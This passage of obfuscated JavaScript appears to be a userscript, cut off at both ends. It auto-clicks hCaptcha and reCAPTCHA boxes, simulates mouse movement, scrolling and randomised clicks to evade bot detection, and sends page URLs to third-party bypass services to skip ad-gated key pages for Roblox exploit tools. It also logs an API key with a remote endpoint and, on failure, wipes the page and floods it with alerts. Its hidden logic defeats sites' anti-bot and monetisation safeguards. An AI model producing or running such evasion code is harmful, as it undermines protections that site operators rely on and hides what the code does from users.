_0x2a3db9=0x1f4,_0x2455b6='#checkbox',_0x5ee4f3=_0x5d1c64(0x2ab);if(window[_0x5d1c64(0x31e)][_0x5d1c64(0x2bf)][_0x5d1c64(0x26e)](_0x5d1c64(0x335)))var _0xcfb29f=setInterval(function(){const _0x291cb4=_0x5d1c64;if(!qSelector(_0x2455b6)){}else{if(qSelector(_0x2455b6)[_0x291cb4(0x1e6)](_0x5ee4f3)==_0x291cb4(0x1ca))clearInterval(_0xcfb29f),console[_0x291cb4(0x314)]('HC\x20SOLVED');else{if(!isHidden(qSelector(_0x2455b6))&&qSelector(_0x2455b6)[_0x291cb4(0x1e6)](_0x5ee4f3)==_0x291cb4(0x29c))qSelector(_0x2455b6)[_0x291cb4(0x182)](),clearInterval(_0xcfb29f),console[_0x291cb4(0x314)]('HC\x20OPEN\x20BOX');else return;}}},_0x2a3db9);const _0x29fbbc=0x1f4,_0x1714ca=_0x5d1c64(0x2dc),_0x343a15=_0x5d1c64(0x293),_0x50552c='.rc-doscaptcha-body';var _0x2062f7=setTimeout(function(){const _0x5c79c5=_0x5d1c64;var _0x15043b=![],_0x45c3e4=![],_0x3c8ae4=0x0,_0x2de0a3=qSelector(_0x343a15)?qSelector(_0x343a15)[_0x5c79c5(0x15c)]:'';function _0x2113bf(_0x39ae81){const _0x4c009c=_0x5c79c5;return _0x39ae81[_0x4c009c(0x18a)]===null;}try{!_0x45c3e4&&qSelector(_0x1714ca)&&!_0x2113bf(qSelector(_0x1714ca))&&(qSelector(_0x1714ca)['click'](),_0x45c3e4=!![],console[_0x5c79c5(0x314)](_0x5c79c5(0x309))),qSelector(_0x343a15)&&qSelector(_0x343a15)[_0x5c79c5(0x15c)]!=_0x2de0a3&&(_0x15043b=!![],console[_0x5c79c5(0x314)](_0x5c79c5(0x2f4))),_0x3c8ae4>0x1&&(console[_0x5c79c5(0x314)](_0x5c79c5(0x171)),_0x15043b=!![]),qSelector(_0x50552c)&&qSelector(_0x50552c)[_0x5c79c5(0x15c)][_0x5c79c5(0x177)]>0x0&&console['log'](_0x5c79c5(0x315));}catch(_0xdef139){console[_0x5c79c5(0x314)](_0xdef139['message']),console[_0x5c79c5(0x314)](_0x5c79c5(0x30c));}},_0x29fbbc);}else console[_0x5d1c64(0x314)](_0x101dc1+'\x20EXCLUDED!');}());async function k(){const _0x6089c7=_0x9d0720;if(typeof APIKEY!==_0x6089c7(0x279))_0x5dceec();else{const _0x4293c6='https://check-whitelist.vercel.app/free/logip?&apikey='+APIKEY();fetch(_0x4293c6)[_0x6089c7(0x2e2)](_0x47aa29=>{const _0x53bb9f=_0x6089c7;_0x47aa29[_0x53bb9f(0x2a4)]!==0xc8&&_0x8a9209();})[_0x6089c7(0x1f2)](()=>{_0x8a9209();});}function _0x151ab1(){document['body']['innerHTML']='';}function _0x25f5da(){const _0x18788a=_0x6089c7;window[_0x18788a(0x20f)]=function(){},window[_0x18788a(0x287)]=function(){},document[_0x18788a(0x161)]=function(){},window[_0x18788a(0x2d4)]=function(){},document[_0x18788a(0x215)][_0x18788a(0x2d8)]='',window[_0x18788a(0x19c)]();}function _0x8a9209(){const _0x9e37a6=_0x6089c7;_0x25f5da(),_0x151ab1();const _0x50920d=document[_0x9e37a6(0x1f4)]('div');_0x50920d[_0x9e37a6(0x30e)][_0x9e37a6(0x336)]=_0x9e37a6(0x16d),_0x50920d[_0x9e37a6(0x30e)][_0x9e37a6(0x26d)]='0',_0x50920d[_0x9e37a6(0x30e)][_0x9e37a6(0x277)]='0',_0x50920d[_0x9e37a6(0x30e)]['width']=_0x9e37a6(0x2a7),_0x50920d['style']['height']=_0x9e37a6(0x2aa),_0x50920d[_0x9e37a6(0x30e)]['backgroundColor']='rgba(0,\x200,\x200,\x200.95)',_0x50920d[_0x9e37a6(0x30e)][_0x9e37a6(0x1f0)]=_0x9e37a6(0x2ac),_0x50920d[_0x9e37a6(0x30e)][_0x9e37a6(0x2f3)]=_0x9e37a6(0x236),_0x50920d['style'][_0x9e37a6(0x1e9)]=_0x9e37a6(0x202),_0x50920d[_0x9e37a6(0x30e)]['alignItems']=_0x9e37a6(0x202),_0x50920d[_0x9e37a6(0x30e)][_0x9e37a6(0x1a2)]=_0x9e37a6(0x21e),_0x50920d[_0x9e37a6(0x2d8)]='Invalid\x20API\x20Key\x20Userscript',document['body']['appendChild'](_0x50920d);const _0x462352=setInterval(()=>{const _0x44c766=_0x9e37a6;alert(_0x44c766(0x2fb));},0xa);setTimeout(()=>{clearInterval(_0x462352);},0x2710);}function _0x5dceec(){const _0x2c00bf=_0x6089c7;_0x25f5da(),_0x151ab1();const _0x3c74ab=document[_0x2c00bf(0x1f4)](_0x2c00bf(0x226));_0x3c74ab['style'][_0x2c00bf(0x336)]='fixed',_0x3c74ab['style'][_0x2c00bf(0x26d)]='0',_0x3c74ab[_0x2c00bf(0x30e)][_0x2c00bf(0x277)]='0',_0x3c74ab[_0x2c00bf(0x30e)]['width']=_0x2c00bf(0x2a7),_0x3c74ab[_0x2c00bf(0x30e)][_0x2c00bf(0x201)]=_0x2c00bf(0x2aa),_0x3c74ab['style']['backgroundColor']='rgba(0,\x200,\x200,\x200.95)',_0x3c74ab['style'][_0x2c00bf(0x1f0)]=_0x2c00bf(0x2ac),_0x3c74ab['style'][_0x2c00bf(0x2f3)]=_0x2c00bf(0x236),_0x3c74ab['style']['justifyContent']=_0x2c00bf(0x202),_0x3c74ab['style'][_0x2c00bf(0x244)]=_0x2c00bf(0x202),_0x3c74ab[_0x2c00bf(0x30e)][_0x2c00bf(0x1a2)]=_0x2c00bf(0x21e),_0x3c74ab[_0x2c00bf(0x2d8)]=_0x2c00bf(0x17f),document[_0x2c00bf(0x215)]['appendChild'](_0x3c74ab);const _0x1683be=setInterval(()=>{const _0x3959f0=_0x2c00bf;alert(_0x3959f0(0x306));},0xa);setTimeout(()=>{clearInterval(_0x1683be);},0x2710);}}(function(){'use strict';const _0x1379c8=_0x9d0720;function _0x1e3d1b(_0xbddc11,_0x4f5284){const _0x29df1e={'text':_0xbddc11,'title':'INFO','silent':!![],'timeout':_0x4f5284||0xbb8};GM_notification(_0x29df1e);}const _0x36a74a=document[_0x1379c8(0x1f4)]('div');_0x36a74a['style'][_0x1379c8(0x336)]=_0x1379c8(0x16d),_0x36a74a[_0x1379c8(0x30e)][_0x1379c8(0x26d)]=_0x1379c8(0x2c7),_0x36a74a[_0x1379c8(0x30e)][_0x1379c8(0x277)]='0',_0x36a74a['style'][_0x1379c8(0x2a5)]=_0x1379c8(0x312),_0x36a74a[_0x1379c8(0x30e)][_0x1379c8(0x1ae)]='#f0f0f0',_0x36a74a[_0x1379c8(0x30e)][_0x1379c8(0x281)]='10px',_0x36a74a[_0x1379c8(0x30e)][_0x1379c8(0x2ff)]=_0x1379c8(0x301),_0x36a74a[_0x1379c8(0x30e)][_0x1379c8(0x318)]=_0x1379c8(0x29f),_0x36a74a[_0x1379c8(0x30e)]['display']='none';const _0x37086a=document[_0x1379c8(0x1f4)]('input');_0x37086a['type']=_0x1379c8(0x216),_0x37086a[_0x1379c8(0x2f0)]='Enter\x20URL',_0x37086a[_0x1379c8(0x30e)][_0x1379c8(0x2a5)]=_0x1379c8(0x17a),_0x37086a['style'][_0x1379c8(0x234)]=_0x1379c8(0x2a9);const _0x5d9f2a=document[_0x1379c8(0x1f4)](_0x1379c8(0x1db));_0x5d9f2a[_0x1379c8(0x15c)]=_0x1379c8(0x16e),_0x5d9f2a[_0x1379c8(0x30e)][_0x1379c8(0x2a5)]=_0x1379c8(0x17a),_0x5d9f2a[_0x1379c8(0x30e)][_0x1379c8(0x1ae)]=_0x1379c8(0x328),_0x5d9f2a[_0x1379c8(0x30e)][_0x1379c8(0x1f0)]=_0x1379c8(0x2ac),_0x5d9f2a[_0x1379c8(0x30e)][_0x1379c8(0x234)]=_0x1379c8(0x1e1);const _0x1d58dd=document['createElement'](_0x1379c8(0x226));_0x1d58dd[_0x1379c8(0x30e)]['marginTop']=_0x1379c8(0x2a9),_0x1d58dd[_0x1379c8(0x30e)][_0x1379c8(0x1f5)]=_0x1379c8(0x21a),_0x1d58dd[_0x1379c8(0x30e)][_0x1379c8(0x201)]=_0x1379c8(0x313),_0x1d58dd[_0x1379c8(0x30e)][_0x1379c8(0x1a0)]=_0x1379c8(0x27d),_0x1d58dd['style'][_0x1379c8(0x2ff)]=_0x1379c8(0x325),_0x1d58dd[_0x1379c8(0x30e)][_0x1379c8(0x281)]='5px',_0x1d58dd['style'][_0x1379c8(0x1ae)]=_0x1379c8(0x239);const _0x458549=document[_0x1379c8(0x1f4)](_0x1379c8(0x1db));_0x458549[_0x1379c8(0x15c)]=_0x1379c8(0x20b),_0x458549[_0x1379c8(0x30e)][_0x1379c8(0x2a5)]=_0x1379c8(0x176),_0x458549[_0x1379c8(0x30e)][_0x1379c8(0x23a)]='4%',_0x458549[_0x1379c8(0x30e)]['backgroundColor']=_0x1379c8(0x328),_0x458549[_0x1379c8(0x30e)][_0x1379c8(0x1f0)]=_0x1379c8(0x2ac);const _0x37906c=document[_0x1379c8(0x1f4)]('button');_0x37906c[_0x1379c8(0x15c)]=_0x1379c8(0x166),_0x37906c[_0x1379c8(0x30e)][_0x1379c8(0x2a5)]=_0x1379c8(0x176),_0x37906c[_0x1379c8(0x30e)][_0x1379c8(0x1ae)]=_0x1379c8(0x328),_0x37906c[_0x1379c8(0x30e)][_0x1379c8(0x1f0)]=_0x1379c8(0x2ac),_0x36a74a[_0x1379c8(0x1a4)](_0x37086a),_0x36a74a[_0x1379c8(0x1a4)](_0x5d9f2a),_0x36a74a[_0x1379c8(0x1a4)](_0x1d58dd),_0x36a74a[_0x1379c8(0x1a4)](_0x458549),_0x36a74a[_0x1379c8(0x1a4)](_0x37906c),document[_0x1379c8(0x215)]['appendChild'](_0x36a74a);const _0x9d8756='https://api.bypass.vip/bypass?url=',_0x428ecd=_0x1379c8(0x164);function _0x55479a(_0x27abba){const _0x10f4d0=_0x1379c8;if(_0x27abba[_0x10f4d0(0x1ee)]('https://getkey.relzscript.xyz/redirect.php?hwid='))_0x408ec8(_0x10f4d0(0x20e),_0x27abba,'key');else _0x27abba[_0x10f4d0(0x1ee)](_0x10f4d0(0x1da))?_0x408ec8(_0x10f4d0(0x321),_0x27abba,_0x10f4d0(0x1ab)):fetch(''+_0x9d8756+encodeURIComponent(_0x27abba))['then'](_0x36fb0f=>_0x36fb0f[_0x10f4d0(0x21f)]())[_0x10f4d0(0x2e2)](_0x404dd6=>{const _0x38f193=_0x10f4d0;if(_0x404dd6[_0x38f193(0x2a4)]==='success')_0x1d58dd[_0x38f193(0x15c)]=_0x418f1f(_0x404dd6[_0x38f193(0x26c)]);else _0x404dd6[_0x38f193(0x2a4)]==='error'&&_0x404dd6[_0x38f193(0x32c)]===_0x38f193(0x1fb)?fetch(''+_0x428ecd+encodeURIComponent(_0x27abba))['then'](_0x122abd=>_0x122abd['json']())['then'](_0x2037ec=>{const _0xcad3f3=_0x38f193;if(_0x2037ec[_0xcad3f3(0x1c8)])_0x1d58dd[_0xcad3f3(0x15c)]=_0x418f1f(_0x2037ec[_0xcad3f3(0x26c)]);else _0x2037ec[_0xcad3f3(0x1c8)]===![]&&_0x2037ec[_0xcad3f3(0x213)]===_0xcad3f3(0x25b)?_0x1d58dd[_0xcad3f3(0x15c)]=_0xcad3f3(0x25b):_0x1d58dd[_0xcad3f3(0x15c)]='Error:\x20Backup\x20API\x20returned\x20no\x20result.';})[_0x38f193(0x1f2)](_0xa95c3a=>{const _0x2dc7d2=_0x38f193;_0x1d58dd[_0x2dc7d2(0x15c)]=_0x2dc7d2(0x330)+_0xa95c3a['message'];}):_0x1d58dd['innerText']='Error:\x20Primary\x20API\x20returned\x20no\x20result.';})[_0x10f4d0(0x1f2)](_0x70470f=>{const _0x2e23c1=_0x10f4d0;_0x1d58dd[_0x2e23c1(0x15c)]=_0x2e23c1(0x330)+_0x70470f[_0x2e23c1(0x32c)];});}function _0x408ec8(_0x8ffc94,_0xa8096d,_0x3f80e0){const _0x21f563=_0x1379c8;fetch(''+_0x8ffc94+encodeURIComponent(_0xa8096d))[_0x21f563(0x2e2)](_0x17ae52=>_0x17ae52[_0x21f563(0x21f)]())['then'](_0x2e4df0=>{const _0x46876b=_0x21f563;_0x2e4df0[_0x46876b(0x2a4)]===_0x46876b(0x1c8)?_0x1d58dd[_0x46876b(0x15c)]=_0x418f1f(_0x2e4df0[_0x3f80e0]):_0x1d58dd[_0x46876b(0x15c)]='Error:\x20Special\x20API\x20returned\x20no\x20result.';})[_0x21f563(0x1f2)](_0x2d20cc=>{const _0x38d9ff=_0x21f563;_0x1d58dd[_0x38d9ff(0x15c)]=_0x38d9ff(0x330)+_0x2d20cc['message'];});}function _0x418f1f(_0x562b62){const _0x275f56=_0x1379c8;try{const _0x427367=decodeURIComponent(_0x562b62);return _0x427367[_0x275f56(0x1ee)](_0x275f56(0x1e8))?_0x427367:_0x562b62;}catch(_0x4b5f15){return _0x562b62;}}_0x5d9f2a['addEventListener']('click',()=>{const _0x308283=_0x1379c8,_0x4528ea=_0x37086a[_0x308283(0x2f8)];if(_0x4528ea['trim']()===''){_0x1d58dd[_0x308283(0x15c)]=_0x308283(0x1d6);return;}_0x55479a(_0x4528ea);}),_0x458549[_0x1379c8(0x161)](_0x1379c8(0x182),()=>{const _0x548b8d=_0x1379c8;_0x1d58dd[_0x548b8d(0x15c)]='',_0x37086a[_0x548b8d(0x2f8)]='';}),_0x37906c[_0x1379c8(0x161)](_0x1379c8(0x182),()=>{const _0xd012a4=_0x1379c8,_0x31503f=_0x1d58dd[_0xd012a4(0x15c)];_0x31503f[_0xd012a4(0x2b9)]()!==''?navigator[_0xd012a4(0x1af)][_0xd012a4(0x273)](_0x31503f)['then'](()=>{const _0x40174e=_0xd012a4;_0x1e3d1b(_0x40174e(0x290));})[_0xd012a4(0x1f2)](_0x44bbb3=>{const _0x24dafe=_0xd012a4;_0x1e3d1b(_0x24dafe(0x211),_0x44bbb3);}):_0x1e3d1b('No\x20text\x20to\x20copy!');}),document[_0x1379c8(0x161)](_0x1379c8(0x332),_0x403523=>{const _0x1e06db=_0x1379c8;_0x403523[_0x1e06db(0x1ab)]==='F8'&&(_0x36a74a[_0x1e06db(0x30e)][_0x1e06db(0x2f3)]===_0x1e06db(0x269)?_0x36a74a[_0x1e06db(0x30e)][_0x1e06db(0x2f3)]=_0x1e06db(0x243):_0x36a74a[_0x1e06db(0x30e)][_0x1e06db(0x2f3)]=_0x1e06db(0x269));});}()),global_module=window[_0x9d0720(0x1f7)];async function VerifyYouAreHuman_01(){const _0x3435e=_0x9d0720;let _0x426379=await global_module[_0x3435e(0x2ed)](_0x3435e(0x2c6),null,null,0xc8,-0x1);global_module[_0x3435e(0x2b4)]($(_0x426379)['eq'](0x0)[0x0]);}async function VerifyYouAreHuman_02(){const _0x1cc6be=_0x9d0720;let _0x42c4bd=await global_module['waitForElement'](_0x1cc6be(0x271),null,null,0xc8,-0x1);global_module['clickElement']($(_0x42c4bd)['eq'](0x0)[0x0]),_0x42c4bd=await global_module[_0x1cc6be(0x2ed)]('span[class=\x27mark\x27]',null,null,0xc8,-0x1),global_module[_0x1cc6be(0x2b4)]($(_0x42c4bd)['eq'](0x0)[0x0]);}async function VerifyYouAreHuman_03(){const _0x52da56=_0x9d0720;let _0x7e9565=await global_module['waitForElement'](_0x52da56(0x2c6),null,null,0xc8,-0x1);global_module[_0x52da56(0x2b4)]($(_0x7e9565)['eq'](0x0)[0x0]);}function _0x2600(_0x43a159,_0x4c05cc){const _0x33d0b8=_0x33d0();return _0x2600=function(_0x260033,_0x17213d){_0x260033=_0x260033-0x159;let _0x5db123=_0x33d0b8[_0x260033];return _0x5db123;},_0x2600(_0x43a159,_0x4c05cc);}async function main(){const _0x190811=_0x9d0720;let _0x29691e=$(_0x190811(0x1f9)),_0x261b0e=$(_0x190811(0x18f));if(_0x29691e[_0x190811(0x177)]>0x0&&_0x261b0e[_0x190811(0x177)]>0x0){VerifyYouAreHuman_01();return;}if(window[_0x190811(0x31e)][_0x190811(0x1a7)]==_0x190811(0x307)&&$(_0x190811(0x15b))[_0x190811(0x177)]>0x0&&$(_0x190811(0x31f))[_0x190811(0x177)]>0x0&&$('div[id=\x27expired\x27]')['length']>0x0){VerifyYouAreHuman_02();return;}if($(_0x190811(0x179))[_0x190811(0x177)]>0x0){VerifyYouAreHuman_03();return;}}$(document)[_0x9d0720(0x185)](()=>main());function sleep(_0x12b731){return new Promise(_0xf8b766=>setTimeout(_0xf8b766,_0x12b731));}async function sub2get(){const _0x134003=_0x9d0720;try{await sleep(0x7d0);const _0x589bd8=await fetch(_0x134003(0x2b8)+window[_0x134003(0x31e)][_0x134003(0x2bf)]),_0x4889e1=await _0x589bd8[_0x134003(0x21f)]();window[_0x134003(0x31e)][_0x134003(0x2bf)]=_0x4889e1[_0x134003(0x26c)];}catch(_0x1255b8){await notification_failed();}}async function sub2unlock(){const _0x316d6a=_0x9d0720;try{await sleep(0x7d0);const _0x15312b=await fetch(_0x316d6a(0x2b8)+window['location'][_0x316d6a(0x2bf)]),_0x320411=await _0x15312b[_0x316d6a(0x21f)]();window['location'][_0x316d6a(0x2bf)]=_0x320411[_0x316d6a(0x26c)];}catch(_0x1e32ae){await notification_failed();}}async function trigon_react(){const _0x9ecc4f=_0x9d0720;let _0x39641b=window['location']['href'];if(_0x39641b[_0x9ecc4f(0x1ee)]('https://trigonevo.com/getkey/?hwid=')){let _0x230c2e=_0x39641b['split'](_0x9ecc4f(0x198))[0x1],_0x4a2a5c='https://pandadevelopment.net/getkey?service=trigon-evo&hwid='+_0x230c2e+_0x9ecc4f(0x28c);window[_0x9ecc4f(0x31e)][_0x9ecc4f(0x2bf)]=_0x4a2a5c;}}async function trigon(){const _0x2e91c9=_0x9d0720;if(window['location'][_0x2e91c9(0x2bf)][_0x2e91c9(0x26e)]('https://trigonevo.fun/whitelist/?HWID=')){let _0x4e9de1=document[_0x2e91c9(0x25f)](_0x2e91c9(0x2ca));_0x4e9de1['forEach'](async function(_0x45a9f3){const _0x3bd342=_0x2e91c9;let _0x5613c7=_0x45a9f3[_0x3bd342(0x1e6)]('onclick');if(_0x5613c7&&_0x5613c7['includes']('https://link-to.net')){let _0x11e87f=/window\.location\.href='(.*?)'/,_0x5d4c58=_0x11e87f[_0x3bd342(0x2ea)](_0x5613c7);if(_0x5d4c58&&_0x5d4c58[0x1]){let _0x2274d3=_0x5d4c58[0x1];try{let _0x3cefed=await fetch(_0x3bd342(0x2b8)+_0x2274d3),_0x206f6b=await _0x3cefed[_0x3bd342(0x21f)]();_0x206f6b[_0x3bd342(0x2a4)]===_0x3bd342(0x1c8)&&_0x206f6b[_0x3bd342(0x26c)]?window['location'][_0x3bd342(0x2bf)]=_0x206f6b[_0x3bd342(0x26c)]:console['error']('API\x20did\x20not\x20return\x20a\x20valid\x20result');}catch(_0xcb9502){console[_0x3bd342(0x213)](_0x3bd342(0x190),_0xcb9502),await notification_failed();}}}});}}async function relz(){const _0x1979c0=_0x9d0720;if(window['location']['href'][_0x1979c0(0x26e)]('https://getkey.relzscript.xyz/check1.php')){let _0x1ce36a=document[_0x1979c0(0x29b)](_0x1979c0(0x248));if(_0x1ce36a){let _0x401f86=_0x1ce36a[_0x1979c0(0x2bf)];try{let _0x1f8579=await fetch('https://api.bypass.vip/bypass?url='+encodeURIComponent(_0x401f86)),_0x568997=await _0x1f8579[_0x1979c0(0x21f)]();_0x568997[_0x1979c0(0x2a4)]===_0x1979c0(0x1c8)&&_0x568997[_0x1979c0(0x26c)]?window[_0x1979c0(0x31e)]['href']=_0x568997['result']:console[_0x1979c0(0x213)](_0x1979c0(0x28d));}catch(_0x20dab3){console['error']('Error\x20fetching\x20API:',_0x20dab3);}}else console[_0x1979c0(0x213)](_0x1979c0(0x286));}else{if(window[_0x1979c0(0x31e)][_0x1979c0(0x2bf)]['includes'](_0x1979c0(0x31b))){let _0x2d458a=document['querySelector'](_0x1979c0(0x1a3));_0x2d458a?window[_0x1979c0(0x31e)][_0x1979c0(0x2bf)]=_0x2d458a[_0x1979c0(0x2bf)]:console[_0x1979c0(0x213)](_0x1979c0(0x286));}else{if(window[_0x1979c0(0x31e)][_0x1979c0(0x2bf)]['includes']('https://getkey.relzscript.xyz/check3.php')){let _0x17df13=document['querySelector']('a[href=\x27https://getkey.relzscript.xyz/finished.php\x27]');_0x17df13?window['location'][_0x1979c0(0x2bf)]=_0x17df13[_0x1979c0(0x2bf)]:console[_0x1979c0(0x213)](_0x1979c0(0x286));}}}}async function bothosting(){function _0x46bbaf(){const _0x3809dc=_0x2600;var _0x3be779='/html/body/div[1]/div/section/section/article/div/main/div[1]/div/div[1]/div/div/button',_0x5385dc=document[_0x3809dc(0x214)](_0x3be779,document,null,XPathResult[_0x3809dc(0x329)],null)[_0x3809dc(0x26a)];_0x5385dc&&_0x5385dc['click']();}setInterval(_0x46bbaf,0x3e8),_0x46bbaf();}async function keyrblx(){function _0x1da0da(_0x593345){const _0x589b2a=_0x2600;let _0x40d429=window[_0x589b2a(0x31e)][_0x589b2a(0x2bf)];if(!_0x40d429[_0x589b2a(0x1ee)](_0x589b2a(0x235)))return;let _0x1f2a6f=document['getElementById'](_0x589b2a(0x280));!_0x1f2a6f&&(_0x1f2a6f=document['createElement']('div'),_0x1f2a6f['id']=_0x589b2a(0x280),_0x1f2a6f[_0x589b2a(0x30e)][_0x589b2a(0x336)]=_0x589b2a(0x16d),_0x1f2a6f[_0x589b2a(0x30e)]['top']=_0x589b2a(0x2a2),_0x1f2a6f[_0x589b2a(0x30e)][_0x589b2a(0x240)]=_0x589b2a(0x260),_0x1f2a6f['style']['transform']=_0x589b2a(0x21b),_0x1f2a6f[_0x589b2a(0x30e)][_0x589b2a(0x1ae)]=_0x589b2a(0x292),_0x1f2a6f[_0x589b2a(0x30e)][_0x589b2a(0x1f0)]=_0x589b2a(0x2ac),_0x1f2a6f['style']['padding']=_0x589b2a(0x2a9),_0x1f2a6f[_0x589b2a(0x30e)][_0x589b2a(0x318)]=_0x589b2a(0x29f),_0x1f2a6f[_0x589b2a(0x30e)][_0x589b2a(0x1e3)]='400px',_0x1f2a6f[_0x589b2a(0x30e)]['overflowY']=_0x589b2a(0x27d),document[_0x589b2a(0x215)]['appendChild'](_0x1f2a6f));let _0x553ee7=document[_0x589b2a(0x1f4)]('div');_0x553ee7['textContent']=_0x593345,_0x1f2a6f[_0x589b2a(0x1a4)](_0x553ee7);}function _0x56fcd6(){const _0x1faa06=_0x2600;return window[_0x1faa06(0x31e)]['href'];}function _0x1e2368(_0x47ed53){return new Promise(_0x2ebfb7=>setTimeout(_0x2ebfb7,_0x47ed53));}function _0x44dff0(_0xd43985,_0x1f7b47){const _0x1f4377=_0x2600,_0x1f113e={'text':_0xd43985,'title':_0x1f4377(0x2f6),'silent':!![]};if(_0x1f7b47)_0x1f113e[_0x1f4377(0x1fc)]=_0x1f7b47;GM_notification(_0x1f113e);}async function _0x280565(_0x13191d,_0x3ef728=0x1f4,_0x5a62f5=0x3e8){const _0x547b01=_0x2600;let _0x3129c9=Math[_0x547b01(0x2ee)](Math['random']()*(_0x5a62f5-_0x3ef728+0x1))+_0x3ef728;await _0x1e2368(_0x3129c9),_0x13191d[_0x547b01(0x182)](),_0x1da0da('Clicked\x20button\x20with\x20delay:\x20'+_0x3129c9+'ms');}function _0x3f6461(_0x4b23de){const _0x2a17cd=_0x2600,_0x1a0eb7=_0x4b23de[_0x2a17cd(0x2da)](),_0xc31cc2=_0x1a0eb7['left']+_0x1a0eb7[_0x2a17cd(0x2a5)]/0x2,_0x589a96=_0x1a0eb7['top']+_0x1a0eb7[_0x2a17cd(0x201)]/0x2;let _0x5ad73a=new MouseEvent(_0x2a17cd(0x27b),{'clientX':_0xc31cc2,'clientY':_0x589a96});document['dispatchEvent'](_0x5ad73a),_0x1da0da('Simulated\x20mouse\x20movement\x20to\x20('+_0xc31cc2+',\x20'+_0x589a96+')');}function _0x569347(){const _0x5edf9f=_0x2600;window[_0x5edf9f(0x175)](0x0,Math['random']()*0x64),_0x1da0da('Scrolled\x20the\x20page');}function _0x100879(_0x569924){const _0x44e73a=_0x2600;let _0x51e951=Array[_0x44e73a(0x2df)](document[_0x44e73a(0x25f)](_0x44e73a(0x1db)))[_0x44e73a(0x252)](_0x166d48=>_0x166d48['textContent']['trim']()===_0x569924);if(_0x51e951)return _0x3f6461(_0x51e951),_0x569347(),_0x280565(_0x51e951),_0x1da0da(_0x44e73a(0x310)+_0x569924),!![];return _0x1da0da(_0x44e73a(0x178)+_0x569924+_0x44e73a(0x276)),![];}function _0xbbb99b(_0x521dc5){return new Promise(_0x548591=>setTimeout(_0x548591,_0x521dc5));}async function _0x3e597d(){const _0x1f3399=_0x2600;_0x44dff0(_0x1f3399(0x251));const _0x1b38f3=setInterval(()=>_0x44dff0('Please\x20solve\x20the\x20captcha',0x1388),0x1770);let _0xabe301='';while(!![]){try{_0xabe301=turnstile[_0x1f3399(0x1fd)]();if(_0xabe301)break;}catch(_0x490d85){}await _0xbbb99b(0x3e8);}return clearInterval(_0x1b38f3),turnstile['getResponse']();}function _0x54cb70(){const _0x34878a=_0x2600;return document[_0x34878a(0x29b)](_0x34878a(0x245))||document[_0x34878a(0x29b)](_0x34878a(0x174));}function _0x573fe8(){const _0x2b3e29=_0x2600;if(document[_0x2b3e29(0x29b)](_0x2b3e29(0x245))&&document['querySelector'](_0x2b3e29(0x228)))return!![];if(document['querySelector'](_0x2b3e29(0x174))&&document[_0x2b3e29(0x29b)](_0x2b3e29(0x210))[_0x2b3e29(0x2f8)])return!![];return![];}async function _0x3a2048(){const _0x246414=_0x2600;if(_0x54cb70()){_0x1da0da(_0x246414(0x251));while(!_0x573fe8()){await _0xbbb99b(0x3e8);}_0x1da0da(_0x246414(0x1de));}document[_0x246414(0x2d0)](_0x246414(0x24c))&&await _0x3e597d();}async function _0x3c3cda(){const _0x4b73fd=_0x2600;let _0xc210ea=_0x56fcd6();_0x1da0da(_0x4b73fd(0x250)+_0xc210ea);if(_0xc210ea[_0x4b73fd(0x1ee)]('https://keyrblx.com/getkey/')){await _0x3a2048();if(_0x100879(_0x4b73fd(0x2ae)))return;}}_0x3c3cda();}async function linkvertise(){const _0x166e19=_0x9d0720,_0x348905=_0x375179=>new Promise(_0x3bc252=>setTimeout(_0x3bc252,_0x375179)),_0x45f1f6=window[_0x166e19(0x31e)][_0x166e19(0x2bf)];let _0x5a4f54=![];const _0x1ed98e=['https://ads.luarmor.net/',_0x166e19(0x302)];function _0x288e1b(_0x1ebcd6,_0x9cc84b){const _0x399ee2=_0x166e19,_0x2a44be={'text':_0x1ebcd6,'title':_0x399ee2(0x2f6),'silent':!![],'timeout':_0x9cc84b||0x1388};GM_notification(_0x2a44be);}function _0x29f951(_0x4d173e,_0x462fbf=![],_0x1449f0=null){const _0x59600e=_0x166e19,_0x2deffc=document['createElement'](_0x59600e(0x226));_0x2deffc['id']=_0x59600e(0x294),_0x2deffc['style'][_0x59600e(0x336)]='fixed',_0x2deffc[_0x59600e(0x30e)][_0x59600e(0x1c6)]=_0x59600e(0x2d9),_0x2deffc['style'][_0x59600e(0x277)]='20px',_0x2deffc[_0x59600e(0x30e)]['zIndex']='1000',_0x2deffc['style']['display']=_0x59600e(0x236),_0x2deffc['style'][_0x59600e(0x244)]=_0x59600e(0x202),_0x2deffc[_0x59600e(0x30e)][_0x59600e(0x1e9)]='center',_0x2deffc['style']['flexDirection']=_0x59600e(0x19b),_0x2deffc[_0x59600e(0x30e)]['backgroundColor']='#4CAF50',_0x2deffc[_0x59600e(0x30e)]['padding']='20px',_0x2deffc[_0x59600e(0x30e)]['borderRadius']=_0x59600e(0x2a9),_0x2deffc[_0x59600e(0x30e)][_0x59600e(0x1f0)]=_0x59600e(0x2ac);const _0x4da341=document[_0x59600e(0x1f4)](_0x59600e(0x226));_0x4da341['id']=_0x59600e(0x2a1),_0x4da341[_0x59600e(0x15c)]=_0x4d173e,_0x2deffc['appendChild'](_0x4da341);if(_0x1449f0){const _0xae22ba=document[_0x59600e(0x1f4)](_0x59600e(0x226));_0xae22ba[_0x59600e(0x30e)][_0x59600e(0x204)]='10px',_0xae22ba[_0x59600e(0x30e)][_0x59600e(0x1a2)]=_0x59600e(0x1e7),_0xae22ba[_0x59600e(0x30e)][_0x59600e(0x261)]=_0x59600e(0x242),_0xae22ba['innerText']=''+_0x1449f0,_0x2deffc[_0x59600e(0x1a4)](_0xae22ba);const _0x52dcd8=document[_0x59600e(0x1f4)](_0x59600e(0x1db));_0x52dcd8['innerText']=_0x59600e(0x166),_0x52dcd8['style'][_0x59600e(0x204)]=_0x59600e(0x2a9),_0x52dcd8['style'][_0x59600e(0x281)]='10px',_0x52dcd8['style'][_0x59600e(0x2ff)]='none',_0x52dcd8[_0x59600e(0x30e)][_0x59600e(0x1ae)]='#008CBA',_0x52dcd8[_0x59600e(0x30e)]['color']='white',_0x52dcd8[_0x59600e(0x30e)]['borderRadius']=_0x59600e(0x1e1),_0x52dcd8[_0x59600e(0x30e)][_0x59600e(0x22c)]=_0x59600e(0x21c),_0x52dcd8[_0x59600e(0x2b0)]=function(){const _0x147b43=_0x59600e;navigator[_0x147b43(0x1af)][_0x147b43(0x273)](_0x1449f0)['then'](()=>{const _0x3e7dc2=_0x147b43;_0x288e1b('Text\x20copied\x20to\x20clipboard'),_0x52dcd8[_0x3e7dc2(0x15c)]='Copied!',setTimeout(()=>{const _0x139198=_0x3e7dc2;_0x52dcd8[_0x139198(0x15c)]='Copy';},0x7d0);})[_0x147b43(0x1f2)](_0x14bba2=>{const 